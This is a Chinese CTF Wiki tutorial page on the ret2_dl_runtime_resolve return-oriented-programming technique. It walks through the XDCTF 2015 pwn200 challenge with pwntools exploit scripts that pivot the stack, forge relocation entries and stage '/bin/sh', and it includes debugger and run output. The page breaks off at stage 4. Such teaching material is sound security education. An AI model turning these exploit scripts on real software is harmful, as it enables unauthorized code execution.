


<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="zh_CN">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <title>高级ROP &#8212; CTF Wiki </title>
    <link rel="stylesheet" href="../../_static/cloud.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
    <link rel="stylesheet" href="../../_static/css/custom.css" type="text/css" />
    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noticia+Text|Open+Sans|Droid+Sans+Mono" type="text/css" />
    <script type="text/javascript">
      var DOCUMENTATION_OPTIONS = {
        URL_ROOT:    '../../',
        VERSION:     '',
        COLLAPSE_INDEX: false,
        FILE_SUFFIX: '.html',
        HAS_SOURCE:  true,
        SOURCELINK_SUFFIX: '.txt'
      };
    </script>
    <script type="text/javascript" src="../../_static/jquery.js"></script>
    <script type="text/javascript" src="../../_static/underscore.js"></script>
    <script type="text/javascript" src="../../_static/doctools.js"></script>
    <script type="text/javascript" src="../../_static/translations.js"></script>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <script type="text/javascript" src="../../_static/jquery.cookie.js"></script>
    <script type="text/javascript" src="../../_static/cloud.base.js"></script>
    <script type="text/javascript" src="../../_static/cloud.js"></script>
    <link rel="shortcut icon" href="../../_static/favicon.ico"/>
    <link rel="search" title="搜索" href="../../search.html" />
    <link rel="next" title="格式化字符串漏洞" href="../fmtstr/index.html" />
    <link rel="prev" title="中级ROP" href="medium_rop.html" /> 
        <meta name="viewport" content="width=device-width, initial-scale=1">
  </head>
  <body>
    <div class="relbar-top">
        
    <div class="related" role="navigation" aria-label="related navigation">
      <h3>导航</h3>
      <ul>
        <li class="right" style="margin-right: 10px">
          <a href="../../index.html" title="內容目录"
             accesskey="C">toc</a></li>
        <li class="right" >
          <a href="../fmtstr/index.html" title="格式化字符串漏洞"
             accesskey="N">下一页</a> &nbsp; &nbsp;</li>
        <li class="right" >
          <a href="medium_rop.html" title="中级ROP"
             accesskey="P">上一页</a> &nbsp; &nbsp;</li>
    <li><a href="../../index.html">CTF Wiki </a> &#187;</li>

          <li class="nav-item nav-item-1"><a href="index.html" accesskey="U">栈溢出</a> &#187;</li> 
      </ul>
    </div>
    </div>
  

    <div class="document">
      <div class="documentwrapper">
        <div class="bodywrapper">
          <div class="body" role="main">
            
  <div class="section" id="rop">
<h1>高级ROP<a class="headerlink" href="#rop" title="永久链接至标题">¶</a></h1>
<p>高级ROP其实和一般的ROP基本一样，其主要的区别在于它利用了一些更加底层的原理。</p>
<div class="section" id="ret2-dl-runtime-resolve">
<h2>ret2_dl_runtime_resolve<a class="headerlink" href="#ret2-dl-runtime-resolve" title="永久链接至标题">¶</a></h2>
<div class="section" id="id1">
<h3>原理<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<p>要想弄懂这个ROP利用技巧，需要首先理解ELF文件的基本结构，以及动态链接的基本过程，请参考executable中elf对应的介绍。这里我只给出相应的利用方式。</p>
<p>我们知道在linux中是利用_dl_runtime_resolve(link_map_obj,
reloc_index)来对动态链接的函数进行重定位的。那么如果我们可以控制相应的参数以及其对应地址的内容是不是就可以控制解析的函数了呢？答案还肯定的。具体利用方式如下</p>
<ol class="arabic simple">
<li><dl class="first docutils">
<dt>控制程序执行dl_resolve函数</dt>
<dd><ul class="first last">
<li>给定Link_map以及index两个参数。</li>
<li>当然我们可以直接给定 plt0对应的汇编代码，这时，我们就只需要一个index就足够了。</li>
</ul>
</dd>
</dl>
</li>
<li>控制index的大小，以便于指向自己所控制的区域，从而伪造一个指定的重定位表项。</li>
<li>伪造重定位表项，使得重定位表项所指的符号也在自己可以控制的范围内。</li>
<li>伪造符号内容，使得符号对应的名称也在自己可以控制的范围内。</li>
</ol>
<p><strong>此外，这个攻击成功的很必要的条件</strong></p>
<ul class="simple">
<li><strong>dl_resolve函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。</strong></li>
<li><strong>dl_resolve函数最后的解析根本上依赖于所给定的字符串。</strong></li>
</ul>
<p>注意：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>符号版本信息</dt>
<dd><ul class="first last">
<li>最好使得ndx = VERSYM[ (reloc-&gt;r_info) &gt;&gt; 8] 的值为0，以便于防止找不到的情况。</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>重定位表项</dt>
<dd><ul class="first last">
<li>r_offset必须是可写的，因为当解析完函数后，必须把相应函数的地址填入到对应的地址。</li>
</ul>
</dd>
</dl>
</li>
</ul>
</div>
<div class="section" id="id2">
<h3>攻击条件<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h3>
<p>说了这么多，这个利用技巧其实还是ROP，同样可以绕过NX和ASLR保护。但是，这个攻击更适于一些比较简单的栈溢出的情况，但同时又难以泄露获取更多信息的情况下。</p>
</div>
<div class="section" id="id3">
<h3>示例<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h3>
<p>这里以XDCTF 2015的pwn200为例。主要参考</p>
<ol class="arabic simple">
<li><a class="reference external" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a> ，深入浅出。</li>
<li><a class="reference external" href="https://www.math1as.com/index.php/archives/341/">https://www.math1as.com/index.php/archives/341/</a></li>
</ol>
<p>首先我们可以编译下ret2dlresolve文件夹下的源文件main.c文件得到二进制文件，这里取消了Canary保护。</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ gcc main.c -m32 -fno-stack-protector -o main
</pre></div>
</div>
<p>在下面的讲解过程中，我会按照以两种不同的方法来进行讲解。其中第一种方法比较麻烦，但是可以仔细理解ret2dlresolve的原理，第二种方法则是直接使用已有的工具，相对容易一点。</p>
<ol class="arabic">
<li><p class="first">利用正常的代码来使用该技巧从而获取shell。</p>
<blockquote>
<div><p>stage 1 测试控制程序执行write函数的效果。</p>
<p>stage 2 测试控制程序执行dl_resolve函数，并且相应参数指向正常write函数的plt时的执行效果。</p>
<p>stage 3 测试控制程序执行dl_resolve函数，并且相应参数指向伪造的write函数的plt时的执行效果。</p>
</div></blockquote>
</li>
<li><p class="first">利用roputils中已经集成好的工具来实现攻击，从而获取shell。</p>
</li>
</ol>
<div class="section" id="id4">
<h4>正常攻击<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>显然我们程序有一个很明显的栈溢出漏洞的。这题我们不考虑我们有libc的情况。我们可以很容易的分析出偏移为112。</p>
<div class="code asm highlight-default"><div class="highlight"><pre><span></span>gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as &#39;$_gef0&#39;
gef➤  r
Starting program: /mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main
Welcome to XDCTF2015~!
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────
$eax   : 0x000000c9
$ebx   : 0x00000000
$ecx   : 0xffffcc6c  →  &quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]&quot;
$edx   : 0x00000100
$esp   : 0xffffcce0  →  &quot;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]&quot;
$ebp   : 0x62616163 (&quot;caab&quot;?)
$esi   : 0xf7fac000  →  0x001b1db0
$edi   : 0xffffcd50  →  0xffffcd70  →  0x00000001
$eip   : 0x62616164 (&quot;daab&quot;?)
$cs    : 0x00000023
$ss    : 0x0000002b
$ds    : 0x0000002b
$es    : 0x0000002b
$fs    : 0x00000000
$gs    : 0x00000063
$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────
[&#39;0xffffcce0&#39;, &#39;l8&#39;]
8
0xffffcce0│+0x00: &quot;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]&quot;  ← $esp
0xffffcce4│+0x04: &quot;faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]&quot;
0xffffcce8│+0x08: &quot;gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]&quot;
0xffffccec│+0x0c: &quot;haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]&quot;
0xffffccf0│+0x10: &quot;iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]&quot;
0xffffccf4│+0x14: &quot;jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]&quot;
0xffffccf8│+0x18: &quot;kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]&quot;
0xffffccfc│+0x1c: &quot;laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]&quot;
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search
[!] Syntax
pattern search PATTERN [SIZE]
gef➤  pattern search 0x62616164
[+] Searching &#39;0x62616164&#39;
[+] Found at offset 112 (little-endian search) likely
</pre></div>
</div>
<div class="section" id="stage-1">
<h5>stage 1<a class="headerlink" href="#stage-1" title="永久链接至标题">¶</a></h5>
<p>这里我们的主要目的是控制程序执行write函数，虽然我们可以控制程序直接执行write函数。但是这里我们采用一个更加复杂的办法，即使用栈迁移的技巧，将栈迁移到bss段来控制write函数。即主要分为两步</p>
<ol class="arabic simple">
<li>将栈迁移到bss段。</li>
<li>控制write函数输出相应字符串。</li>
</ol>
<p>这里主要使用了pwntools中的ROP模块。具体代码如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1">## stack privot to bss segment</span>
<span class="c1">## new stack size is 0x800</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="c1">### padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="c1">### read 100 byte to base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">### stack privot, set esp = base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="c1">## write cmd=&quot;/bin/sh&quot;</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>
<span class="n">rop</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>结果如下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ python stage1.py
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process &#39;./main&#39;: pid 120912
[*] Loaded cached gadgets for &#39;./main&#39;
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
</pre></div>
</div>
</div>
<div class="section" id="stage-2">
<h5>stage 2<a class="headerlink" href="#stage-2" title="永久链接至标题">¶</a></h5>
<p>在这一阶段，我们将会利用dlresolve相关的知识来控制程序执行write函数。这里我们主要是利用plt[0]中的相关指令，即push linkmap以及跳转到dl_resolve函数中解析的指令。此外，我们还得单独提供一个write重定位项在plt表中的偏移。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1">## stack privot to bss segment</span>
<span class="c1">## new stack size is 0x800</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="c1">### padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="c1">### read 100 byte to base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">### stack privot, set esp = base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="c1">## write cmd=&quot;/bin/sh&quot;</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>

<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">write_index</span> <span class="o">=</span> <span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span> <span class="o">-</span> <span class="n">plt0</span><span class="p">)</span> <span class="o">/</span> <span class="mi">16</span> <span class="o">-</span> <span class="mi">1</span>
<span class="n">write_index</span> <span class="o">*=</span> <span class="mi">8</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">write_index</span><span class="p">)</span>
<span class="c1">## fake ret addr of write</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>效果如下，仍然输出了cmd对应的字符串。</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ python stage2.py
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process &#39;./main&#39;: pid 123406
[*] Loaded cached gadgets for &#39;./main&#39;
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
</pre></div>
</div>
</div>
<div class="section" id="stage-3">
<h5>stage 3<a class="headerlink" href="#stage-3" title="永久链接至标题">¶</a></h5>
<p>这一次，我们同样控制dl_resolve函数中的index_offset参数，不过这次控制其指向我们伪造的write重定位项。</p>
<p>鉴于pwntools本身并不支持对重定位表项的信息的获取。这里我们手动看一下</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ readelf -r main

重定位节 &#39;.rel.dyn&#39; 位于偏移量 0x318 含有 3 个条目：
 偏移量     信息    类型              符号值      符号名称
08049ffc  00000306 R_386_GLOB_DAT    00000000   __gmon_start__
0804a040  00000905 R_386_COPY        0804a040   stdin@GLIBC_2.0
0804a044  00000705 R_386_COPY        0804a044   stdout@GLIBC_2.0

重定位节 &#39;.rel.plt&#39; 位于偏移量 0x330 含有 5 个条目：
 偏移量     信息    类型              符号值      符号名称
0804a00c  00000107 R_386_JUMP_SLOT   00000000   setbuf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   read@GLIBC_2.0
0804a014  00000407 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a018  00000507 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   write@GLIBC_2.0
</pre></div>
</div>
<p>可以看出write的重定表项的r_offset=0x0804a01c，r_info=0x00000607。具体代码如下</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;main&#39;</span><span class="p">)</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>

<span class="n">offset</span> <span class="o">=</span> <span class="mi">112</span>
<span class="n">bss_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Welcome to XDCTF2015~!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

<span class="c1">## stack privot to bss segment</span>
<span class="c1">## new stack size is 0x800</span>
<span class="n">stack_size</span> <span class="o">=</span> <span class="mh">0x800</span>
<span class="n">base_stage</span> <span class="o">=</span> <span class="n">bss_addr</span> <span class="o">+</span> <span class="n">stack_size</span>
<span class="c1">### padding</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span><span class="p">)</span>
<span class="c1">### read 100 byte to base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">base_stage</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="c1">### stack privot, set esp = base_stage</span>
<span class="n">rop</span><span class="o">.</span><span class="n">migrate</span><span class="p">(</span><span class="n">base_stage</span><span class="p">)</span>
<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>

<span class="c1">## write sh=&quot;/bin/sh&quot;</span>
<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="s1">&#39;./main&#39;</span><span class="p">)</span>
<span class="n">sh</span> <span class="o">=</span> <span class="s2">&quot;/bin/sh&quot;</span>

<span class="n">plt0</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="n">rel_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">get_section_by_name</span><span class="p">(</span><span class="s1">&#39;.rel.plt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">header</span><span class="o">.</span><span class="n">sh_addr</span>
<span class="c1">## making base_stage+24 ---&gt; fake reloc</span>
<span class="n">index_offset</span> <span class="o">=</span> <span class="n">base_stage</span> <span class="o">+</span> <span class="mi">24</span> <span class="o">-</span> <span class="n">rel_plt</span>
<span class="n">write_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;write&#39;</span><span class="p">]</span>
<span class="n">r_info</span> <span class="o">=</span> <span class="mh">0x607</span>

<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">plt0</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">index_offset</span><span class="p">)</span>
<span class="c1">## fake ret addr of write</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;bbbb&#39;</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">base_stage</span> <span class="o">+</span> <span class="mi">80</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sh</span><span class="p">))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">write_got</span><span class="p">)</span>  <span class="c1"># fake reloc</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">r_info</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">rop</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">100</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())))</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">chain</span><span class="p">())</span>
<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>
</div>
<p>最后结果如下，这次我们在bss段伪造了一个假的write的重定位项，仍然输出了对应的字符串。</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ python stage3.py
[*] &#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/stackoverflow/example/ret2dlresolve/main&#39;
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process &#39;./main&#39;: pid 126063
[*] Loaded cached gadgets for &#39;./main&#39;
[*] Switching to interactive mode
/bin/sh[*] Got EOF while reading in interactive
</pre></div>
</div>
</div>
<div class="section" id="stage-4">
<h5>stage 4<a class="headerlink" href="#stage-4" title="永久链接至标题">¶</a></h5>
<p>stage3中，我们控制了重定位表项，但是重定位表项的内容与write原来的重定位表项一致，这次，我们将构造属于我们自己的重定位表项，并且伪造该表项对应的符号。首先，我们根据write的重定位表项的r_info=0x607可以知道，write对应的符号在符号表的下标为0x607&gt;&gt;8=0x6。因此，我们知道write对应的符号地址为0x8048238。</p>
<div class="code shell highlight-default"><div class="highlight"><pre><span></span>➜  ret2dlresolve git:(master) ✗ objdump -s -EL -j  .dynsym main

main：     文件格式 elf32-i386

Contents of section .dynsym:
 80481d8 00000000 00000000 00000000 00000000  ................
 80481e8 33000000 00000000 00000000 12000000  3...............
 80481f8 27000000 00000000 00000000 12000000  &#39;...............
 8048208 52000000 00000000 00000000 20000000  R........... ...
 8048218 20000000 00000000 00000000 12000000   ...............
 8048228 3a000000 00000000 00000000 12000000  :...............
 8048238 4c000000 00000000 00000000 12000000  L...............
 8048248 2c000000 44a00408 04000000 11001a00  ,...D...........
 8048258 0b000000 3c860408 04000000 11001000  ....&lt;...........
 8048268 1a000000 40a00408 04000000 11001a00  ....@...........
</pre></div>
</div>
<p>这里给出的其实是小端模式，因此我们需要手工转换。此外，每个符号占用的大小为16个字节。</p>
<div class="code python highlight-default"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="k">import</span> <span class="o">*</span>
